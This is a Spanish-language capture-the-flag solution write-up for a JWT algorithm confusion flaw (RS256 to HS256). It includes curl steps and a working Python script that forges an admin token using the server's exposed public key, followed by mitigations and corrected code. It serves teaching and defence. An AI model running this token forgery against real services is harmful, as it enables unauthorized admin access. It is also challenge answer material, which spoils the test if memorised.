# Solución — api-cloudconnect · CloudConnect OAuth API

## TL;DR

Vulnerabilidad: **JWT Algorithm Confusion (RS256 → HS256)**.
El servidor acepta tokens firmados con HS256 usando la clave pública RSA como secreto HMAC.
Como la clave pública está expuesta en `/jwks.json`, cualquier atacante puede forjar un JWT con `role=admin` sin conocer la clave privada.

---

## Vulnerabilidad

**Tipo:** JWT Algorithm Confusion / Algorithm Substitution  
**CVE de referencia:** Similar a CVE-2015-9235 (jsonwebtoken) y técnica documentada por PortSwigger  
**Impacto:** Escalada de privilegios de `viewer` a `admin` → acceso a endpoint oculto con la FLAG

### Raíz del problema

El servidor llama a `jwt.decode()` de la siguiente forma:

```python
payload = jwt.decode(
    token,
    PUBLIC_KEY_PEM,                  # misma key para RS256 y HS256
    algorithms=["RS256", "HS256"],   # acepta AMBOS algoritmos
    audience="cloudconnect-api",
    issuer="cloudconnect-oauth",
)
```

Cuando el header del JWT dice `alg=HS256`, PyJWT trata `PUBLIC_KEY_PEM` como el secreto HMAC.
Si el atacante conoce `PUBLIC_KEY_PEM` (disponible en `/jwks.json`) puede forjar cualquier payload firmado con HS256 y el servidor lo aceptará como válido.

---

## Paso a Paso

### Paso 1 — Obtener la clave pública

```bash
curl -s http://<host>:5002/jwks.json | python3 -m json.tool
```

Respuesta relevante:

```json
{
  "public_key_pem": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq...\n-----END PUBLIC KEY-----\n",
  "keys": [...]
}
```

Guardar el valor de `public_key_pem` — este es el secreto que usaremos para firmar el JWT con HS256.

### Paso 2 — Obtener un token legítimo e inspeccionar la estructura

```bash
curl -s -X POST http://<host>:5002/oauth/token \
  -H "Content-Type: application/json" \
  -d '{"username": "ctfuser", "password": "ctfpass2024"}'
```

Respuesta:

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read"
}
```

Pegar el token en [jwt.io](https://jwt.io) para ver el payload:

```json
{
  "sub": "ctfuser",
  "role": "viewer",
  "iat": 1719000000,
  "exp": 1719003600,
  "iss": "cloudconnect-oauth",
  "aud": "cloudconnect-api"
}
```

El objetivo es forjar un token idéntico pero con `"role": "admin"`.

### Paso 3 — Forjar el JWT con HS256

Usar el siguiente script Python:

```python
import jwt
import time
import requests

# 1. Obtener la clave pública del servidor
r = requests.get("http://<host>:5002/jwks.json")
public_key_pem = r.json()["public_key_pem"]

# 2. Construir el payload con role=admin
payload = {
    "sub": "ctfuser",
    "role": "admin",                  # escalada de privilegios
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
    "iss": "cloudconnect-oauth",
    "aud": "cloudconnect-api",
}

# 3. Firmar con HS256 usando la clave PÚBLICA como secreto HMAC
forged_token = jwt.encode(
    payload,
    public_key_pem,      # el servidor usará este mismo valor para verificar
    algorithm="HS256",   # forzamos HS256 en el header
)

print("Token forjado:")
print(forged_token)

# 4. Usar el token forjado para acceder al endpoint de admin
headers = {"Authorization": f"Bearer {forged_token}"}
r = requests.get("http://<host>:5002/api/admin/export", headers=headers)
print(r.json())
```

### Paso 4 — Obtener la FLAG

```bash
python3 exploit.py
```

Respuesta esperada:

```json
{
  "export": "full_system_export",
  "classification": "TOP_SECRET",
  "flag": "HL4{...}",
  "connections_count": 1247,
  "data_exported_gb": 892.4
}
```

---

## Por qué es INSANE

1. **Conocimiento no obvio:** El ataque requiere entender la mecánica interna de cómo las bibliotecas JWT manejan la selección de algoritmo. No es suficiente saber que "RS256 usa clave pública/privada".

2. **El servidor parece seguro:** Toda la documentación visible (`/`, `/health`, challenge description) menciona RS256 exclusivamente. La aceptación silenciosa de HS256 no se anuncia en ningún lado.

3. **El endpoint objetivo está oculto:** `/api/admin/export` no aparece en el índice de endpoints. Requiere fuzzing o inferencia a partir del análisis de tráfico.

4. **El PEM en `/jwks.json` es un señuelo / facilitador:** Ver la clave pública expuesta puede interpretarse erróneamente como "esto es normal en OAuth2/JWKS". La conexión entre "tengo la clave pública" y "puedo forjar tokens HS256" requiere conocer el ataque específico.

5. **Sin brute-force ni SQLi:** El reto no tiene superficie de ataque convencional. Requiere razonamiento criptográfico puro.

---

## Mitigaciones

| Medida | Descripción |
|--------|-------------|
| **Fijar el algoritmo** | `jwt.decode(token, key, algorithms=["RS256"])` — nunca pasar una lista que incluya HS256 junto con RS256 |
| **Usar objetos de clave tipados** | En PyJWT, pasar `RSAPublicKey` en lugar de `str` PEM hace que HS256 falle por tipo incompatible |
| **No exponer el PEM en JWKS** | El estándar JWKS (RFC 7517) no requiere ni recomienda incluir el PEM completo |
| **Validar el algoritmo del header antes de verificar** | Rechazar explícitamente tokens cuyo `alg` no coincida con el esperado por el servidor |
| **Actualizar a versiones modernas** | PyJWT >= 2.4.0 tiene controles adicionales, pero la configuración errónea de `algorithms` sigue siendo posible |

### Código corregido

```python
# CORRECTO: solo RS256, key como objeto criptográfico
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey

payload = jwt.decode(
    token,
    _public_key,           # objeto RSAPublicKey, no string PEM
    algorithms=["RS256"],  # lista de un solo elemento
    audience="cloudconnect-api",
    issuer="cloudconnect-oauth",
)
```

---

## Referencias

- [PortSwigger: JWT attacks — Algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [RFC 7515 — JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [CVE-2015-9235 — jsonwebtoken algorithm confusion](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
- [PyJWT documentation — Algorithms](https://pyjwt.readthedocs.io/en/stable/algorithms.html)
